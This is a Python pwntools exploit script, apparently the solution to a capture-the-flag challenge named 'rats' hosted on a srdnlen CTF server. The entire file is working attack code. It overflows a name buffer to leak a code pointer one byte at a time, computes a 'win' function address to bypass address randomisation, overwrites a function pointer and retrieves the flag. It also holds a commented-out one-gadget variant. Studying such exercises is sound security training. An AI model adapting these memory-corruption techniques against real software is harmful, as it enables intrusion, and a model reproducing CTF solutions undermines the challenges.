from pwn import *

from pwnlib.util.packing import p64

e = ELF('./rats')

dialogue_offset = e.functions._Z8dialogueP3rat.address
print(hex(dialogue_offset))

r = remote('rats.challs.srdnlen.it', 15002)

# Reach exploit portion: Allocate three rats.
# First rat has 15 character long name.
# Second rat is there to trigger the bug and leak 4 even bytes.
# Third rat leaks 4 odd bytes
r.writeline(b'1')
r.readuntil(b'a name')
r.writeline(b'123456789012345')
r.readuntil(b'Quit.')
r.writeline(b'1')
r.readuntil(b'a name')
r.writeline(b'123456789012345')
r.readuntil(b'Quit.')
r.writeline(b'1')
r.readuntil(b'a name')
r.writeline(b'victim2')
r.readuntil(b'Quit.')

''' # One gadget variant: requires libc identification
# Cause one gadget
r.writeline(b'3')
r.readuntil(b'number')
r.writeline(b'0')
r.readuntil(b'a name')
r.writeline(b'aaaabbbbccccddddeeeeffffgggghhhh11112222' + p64(process_onegadget))

# Trigger bug
r.readuntil(b'Quit.')
r.writeline(b'2')
r.readuntil(b'number')
r.writeline(b'1')
'''

full_pointer = 0

# Leak one byte at a time

# start with victim 2's odd bytes
for i in range(4):
    r.writeline(b'3')
    r.readuntil(b'number')
    r.writeline(b'1')
    r.readuntil(b'a name')
    payload = b'z'*(40+2*i + 1)
    r.writeline(payload)
    r.readuntil(b'Quit.')
    r.writeline(b'2')
    r.readuntil(b'number')
    r.writeline(b'1')
    r.readuntil(payload)
    byteleak = r.readline()
    print(byteleak)
    if byteleak == b'.\n':  # String is terminated without leak = leaked byte is null
        byteleak = [0]
    print(hex(byteleak[0]))
    full_pointer += byteleak[0] << (8*(2*i + 1))

# Continue with victim 1's even bytes
for i in range(4):
    r.writeline(b'3')
    r.readuntil(b'number')
    r.writeline(b'0')
    r.readuntil(b'a name')
    payload = b'z'*(40+2*i)
    r.writeline(payload)
    r.readuntil(b'Quit.')
    r.writeline(b'2')
    r.readuntil(b'number')
    r.writeline(b'0')
    r.readuntil(payload)
    byteleak = r.readline()
    print(byteleak)
    if byteleak == b'.\n':  # String is terminated without leak = leaked byte is null
        byteleak = [0]
    print(hex(byteleak[0]))
    full_pointer += byteleak[0] << (8*2*i)

print(hex(full_pointer))
win_ptr = full_pointer - dialogue_offset + e.functions._Z3winv.address


# Execute win function!
r.writeline(b'3')
r.readuntil(b'number')
r.writeline(b'0')
r.readuntil(b'a name')
payload = b'z'*40 + p64(win_ptr)
r.writeline(payload)
r.readuntil(b'Quit.')
r.writeline(b'2')
r.readuntil(b'number')
r.writeline(b'1')
r.readuntil('srdnlen{')
flag = r.readuntil('}')
r.close()

print('srdnlen{' + flag.decode('utf8'))
